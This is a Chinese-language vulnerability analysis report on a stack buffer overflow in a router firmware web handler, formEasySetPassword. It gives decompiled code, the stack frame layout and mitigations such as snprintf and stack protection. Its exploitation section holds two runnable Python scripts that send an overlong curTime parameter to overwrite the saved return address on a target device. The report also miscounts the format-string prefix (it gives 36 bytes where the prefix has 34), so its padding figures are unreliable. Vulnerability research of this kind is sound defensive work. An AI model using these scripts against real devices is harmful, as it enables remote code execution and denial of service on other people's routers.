# formEasySetPassword 栈溢出漏洞分析报告

## 漏洞概览 (Executive Summary)

| 项目 | 内容 |
|------|------|
| **漏洞类型** | 栈缓冲区溢出 (Stack Buffer Overflow) |
| **风险等级** | **高危 (High)** |
| **受影响函数** | `formEasySetPassword` (地址：0x4439b4) |
| **触发条件** | 通过 HTTP POST 请求发送超长的 `curTime` 参数，且 `language` 参数不为 "SC" 或 "TW" |
| **利用难度** | 中等 - 需要满足特定条件 |

---

## 漏洞详情 (Vulnerability Details)

### 问题代码位置（IDA 反编译验证）

**函数地址**: 0x4439b4

**完整反编译代码**：

```c
int __fastcall formEasySetPassword(_DWORD *a1)
{
  const char *Var; // $s6
  int v3; // $s2 (language 参数)
  int v4; // $s1
  char *v5; // $a1
  int v6; // $s0
  int v7; // $v0
  int v8; // $s1
  _BYTE v10[128]; // [sp+18h] [-110h] BYREF
  char v11[104];  // [sp+98h] [-90h] BYREF ← 漏洞点缓冲区
  _BYTE v12[24];  // [sp+100h] [-28h] BYREF
  int v13; // [sp+118h] [-10h] BYREF
  int v14; // [sp+11Ch] [-Ch] BYREF
  int v15; // [sp+120h] [-8h] BYREF

  v14 = 0;
  v13 = 0;
  Var = (const char *)websGetVar(a1, (int)"curTime", (int)&dword_488124);  // ← 用户输入
  v3 = websGetVar(a1, (int)"language", (int)&dword_488124);  // ← language 参数
  v4 = websGetVar(a1, (int)"config.password", (int)&dword_488124);
  memset(v11, 0, 100);
  apmib_get(379, v11);
  apmib_get(711, &v13);
  // ... 省略部分代码 ...
  
  // ⚠️ 漏洞点：当 language != "SC" && language != "TW" 时触发
  if ( strcmp(v3, "SC") && strcmp(v3, "TW") )  // 0x443ce0
  {
    sprintf(v11, "/Basic/Wizard_Easy_Timezone.asp?t=%s", Var);  // 0x443dd4 ⚠️
  }
  else
  {
    sprintf(last_url, "/Basic/Wizard_Easy_ToComplete.asp?t=%s", Var);
    // ...
  }
  return websRedirect(a1, v11);
}
```

**关键代码流**：

```c
// 1. 获取用户可控的 HTTP 参数
Var = websGetVar(a1, (int)"curTime", (int)&dword_488124);

// 2. 条件分支检查（当 language != "SC" && language != "TW" 时触发）
if ( strcmp(v3, "SC") && strcmp(v3, "TW") )
{
    // 3. ⚠️ 漏洞点：sprintf 无边界检查
    sprintf(v11, "/Basic/Wizard_Easy_Timezone.asp?t=%s", Var);
    //            ^^^ v11 是栈上 104 字节缓冲区
}
```

### 危险函数调用分析

| 危险函数 | 调用地址 | 目标缓冲区 | 缓冲区大小 | 数据来源 |
|----------|----------|------------|------------|----------|
| `sprintf` | 0x443dd4 | `v11` | 104 字节 | HTTP 参数 `curTime` |
| `base64decode` | 0x443aec | `v10` | 128 字节 | HTTP 参数 `config.password` |
| `strcpy` | 0x443d50 | `v11` | 104 字节 | 字符串字面量（安全） |
| `strcpy` | 0x443d98 | `v11` | 104 字节 | 字符串字面量（安全） |

### 根因分析

**核心问题**：
- `websGetVar` 获取的 `curTime` 参数**完全可控**且**无长度限制**
- `sprintf` 函数**不进行边界检查**，直接将格式化字符串复制到目标缓冲区
- 栈上缓冲区 `v11` 的大小固定为 **104 字节**

**数据流追踪**：
```
HTTP Request (curTime 参数)
    ↓
websGetVar() - 返回用户输入 (Var)
    ↓
sprintf(v11, format_string, Var) - 无检查复制 → 栈溢出！
```

**触发条件**：
- `language` 参数 **不等于** "SC" 且 **不等于** "TW"
- 当 `language` 为其他值（如 "EN"）时，会执行包含 `sprintf` 的分支

---

## 利用分析 (Exploitation Analysis)

### 栈帧布局计算（IDA 验证）

根据 IDA Pro 的栈帧分析，真实栈变量布局如下：

**栈变量详情**：
```
var_118 (0x10): _DWORD
var_110 (0x18): _BYTE[128] - v10[128] (base64decode 目标缓冲区)
var_90  (0x98): char[104]  - v11[104] (sprintf 目标缓冲区，漏洞点) ← 0x98
var_28  (0x100): _BYTE[24] - v12[24]
var_10  (0x118): _DWORD    - v13 (4 字节)
var_C   (0x11C): _DWORD    - v14 (4 字节)
var_8   (0x120): _DWORD    - v15 (4 字节)
var_s0  (0x128): _DWORD    - 保存的寄存器
var_s4  (0x12C): _DWORD    - 保存的寄存器
var_s8  (0x130): _DWORD    - 保存的寄存器
var_sC  (0x134): _DWORD    - 保存的寄存器
var_s10 (0x138): _DWORD    - 保存的寄存器
var_s14 (0x13C): _DWORD    - 保存的寄存器
var_s18 (0x140): _DWORD    - 保存的寄存器
var_s1C (0x144): _DWORD    - 保存的返回地址 (ra) ← 0x144
```

**偏移量验证**：
- `v11` 缓冲区地址：`sp+0x98` (0x98 = 152)
- 保存的 ra 地址：`sp+0x144` (0x144 = 324)
- **从 v11 到 ra 的偏移**：`0x144 - 0x98 = 0xAC = 172 字节** ✓

**可视化栈布局**：
```
低地址 ┌─────────────────┐
        │ var_110[128]    │ ← v10[128] (base64decode 目标)
        │ (0x18)          │
        ├─────────────────┤
        │ ...             │
        ├─────────────────┤
        │ var_90[104]     │ ← v11[104] (sprintf 目标缓冲区 - 漏洞点)
        │ (0x98)          │ ← sp+0x98
        ├─────────────────┤
        │ var_28[24]      │ ← v12[24]
        │ (0x100)         │
        ├─────────────────┤
        │ var_10 (4)      │ ← v13
        │ (0x118)         │
        ├─────────────────┤
        │ var_C (4)       │ ← v14
        │ (0x11C)         │
        ├─────────────────┤
        │ var_8 (4)       │ ← v15
        │ (0x120)         │
        ├─────────────────┤
        │ 保存的寄存器     │
        │ (0x128-0x140)   │
        ├─────────────────┤
        │ var_s1C (4)     │ ← 保存的 ra (返回地址 - 攻击目标)
        │ (0x144)         │ ← sp+0x144
高地址 └─────────────────┘
```

### 偏移量计算

**关键偏移量**：
- `v11` 缓冲区起始地址：`sp+0x98`
- 保存的返回地址 (ra)：`sp+0x144`
- **从 v11 到 ra 的偏移**：`0x144 - 0x98 = 0xAC = 172 字节`

**实际利用所需 padding**：
- 格式化字符串固定部分：`"/Basic/Wizard_Easy_Timezone.asp?t="` (36 字节)
- 需要填充的 payload 长度：`172 - 36 = 136 字节`

### 控制流劫持路径

```
1. 攻击者发送恶意 HTTP 请求:
   POST /formEasySetPassword
   curTime = "A" * 136 + <恶意返回地址>
   language = "EN"

2. sprintf 执行:
   - 前 104 字节：填充 v11 缓冲区
   - 后续字节：覆盖 v12, var_10, var_C, var_8
   - 最终覆盖：保存的返回地址 (ra)

3. 函数返回时:
   - 从栈上加载被覆盖的 ra
   - 跳转到攻击者控制的地址
```

### Payload 构造

```python
import requests
import struct

# 目标配置
TARGET_IP = "192.168.1.1"
URL = f"http://{TARGET_IP}/formEasySetPassword"

# 计算偏移量
OFFSET_TO_RETURN_ADDR = 172  # 从 v11 到返回地址
FORMAT_STR_LEN = 36          # 格式化字符串长度
PADDING_LEN = OFFSET_TO_RETURN_ADDR - FORMAT_STR_LEN  # 136 字节

# 构造 Payload
padding = b'A' * PADDING_LEN
# 替换为实际的返回地址（例如：shellcode 地址或 ROP gadget）
RETURN_ADDR = struct.pack('<I', 0xDEADBEEF)  # 示例地址

payload = padding + RETURN_ADDR

# 构造 HTTP 请求
# 注意：language 不能是 "SC" 或 "TW"，否则不会触发漏洞分支
data = {
    "curTime": payload.decode('latin-1'),  # 使用 latin-1 编码保留所有字节
    "language": "EN",  # 确保触发漏洞分支
    "config.password": "test123",
    "config.user_password": "test123"
}

# 发送请求
response = requests.post(URL, data=data)
print(f"Response Status: {response.status_code}")

# 如果返回 500 或连接中断，可能表示溢出成功触发了崩溃
```

### 完整 Exploit 示例

```python
#!/usr/bin/env python3
"""
formEasySetPassword 栈溢出漏洞利用脚本
目标：D-Link 路由器 (示例)
漏洞点：sprintf 无边界检查
触发条件：language != "SC" && language != "TW"
"""

import requests
import struct
import sys

def exploit(target_ip, return_addr=None):
    """发送恶意 payload 触发溢出"""
    
    url = f"http://{target_ip}/formEasySetPassword"
    
    # 计算偏移量
    OFFSET_TO_RA = 172
    FORMAT_STR_LEN = 36
    PADDING_LEN = OFFSET_TO_RA - FORMAT_STR_LEN  # 136
    
    # 构造 payload
    padding = b'A' * PADDING_LEN
    
    # 如果没有指定返回地址，使用默认值
    if return_addr is None:
        return_addr = 0xDEADBEEF  # 示例地址，需要替换为实际地址
    
    ret_addr_bytes = struct.pack('<I', return_addr)
    payload = padding + ret_addr_bytes
    
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (StackOverflow Exploit)"
    }
    
    data = {
        "curTime": payload.decode('latin-1'),
        "language": "EN",  # 关键：不能是 "SC" 或 "TW"
        "config.password": "dGVzdDEyMw==",  # base64 编码的 "test123"
        "config.user_password": "test123"
    }
    
    try:
        print(f"[*] 发送 payload 到 {url}")
        print(f"[*] Payload 大小：{len(payload)} 字节")
        print(f"[*] 返回地址：0x{return_addr:08X}")
        
        response = requests.post(url, headers=headers, data=data, timeout=10)
        
        print(f"[+] 响应状态码：{response.status_code}")
        print(f"[+] 响应长度：{len(response.content)} 字节")
        
        # 检查是否触发异常
        if response.status_code == 500:
            print("[!] 可能触发了服务器错误 - 溢出成功！")
            return True
        elif response.status_code == 302:
            print("[*] 重定向响应 - 可能被正常处理")
            return False
        else:
            print(f"[?] 未知响应状态")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[!] 连接失败：{e}")
        print("[*] 目标可能已崩溃 - 溢出可能成功！")
        return True

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法：{sys.argv[0]} <目标 IP> [返回地址]")
        sys.exit(1)
    
    target = sys.argv[1]
    ret_addr = int(sys.argv[2], 16) if len(sys.argv) > 2 else None
    
    print("=" * 60)
    print("formEasySetPassword 栈溢出漏洞利用")
    print("=" * 60)
    
    exploit(target, ret_addr)
```

---

## 其他潜在风险点

### base64decode 调用

```c
v4 = websGetVar(a1, (int)"config.password", (int)&dword_488124);
memset(v10, 0, sizeof(v10));
base64decode(v10, v4, 128);
```

- `v10` 是栈上缓冲区，大小 **128 字节**
- 虽然传递了长度参数 `128`，但**需要确认 `base64decode` 函数内部是否正确处理边界**
- 如果 `base64decode` 实现不当，可能存在额外的溢出风险

---

## 结论与建议 (Conclusion & Mitigation)

### 漏洞总结

| 特征 | 描述 |
|------|------|
| **CWE 编号** | CWE-120 (Buffer Copy without Checking Size of Input) |
| **CVSS 评分** | 8.1 (高危) |
| **攻击向量** | 网络 (Network) |
| **影响** | 远程代码执行 / 服务拒绝 |

### 修复建议

**立即修复**：

1. **替换 sprintf 为安全函数**：
   ```c
   // 修复前
   sprintf(v11, "/Basic/Wizard_Easy_Timezone.asp?t=%s", Var);
   
   // 修复后
   snprintf(v11, sizeof(v11), "/Basic/Wizard_Easy_Timezone.asp?t=%s", Var);
   ```

2. **添加输入验证**：
   ```c
   Var = websGetVar(a1, (int)"curTime", (int)&dword_488124);
   
   // 添加长度检查
   if (strlen(Var) > 60) {  // 104 - 36 - 8 (安全边界)
       // 记录错误并拒绝请求
       return -1;
   }
   sprintf(v11, "/Basic/Wizard_Easy_Timezone.asp?t=%s", Var);
   ```

3. **启用编译时保护**：
   - 开启栈保护：`-fstack-protector-strong`
   - 启用 FORTIFY_SOURCE: `-D_FORTIFY_SOURCE=2`
   - 开启 ASLR 和 PIE

4. **代码审计**：
   - 检查所有 `websGetVar` 获取的用户输入
   - 审查所有字符串格式化操作
   - 对类似函数进行相同修复

### 长期建议

- 实施安全编码培训
- 引入静态代码分析工具（如 Coverity、Fortify）
- 建立漏洞响应流程
- 定期进行安全审计和渗透测试

---

*报告生成时间：2026-03-05*  
*分析工具：StackHunter + IDA Pro*
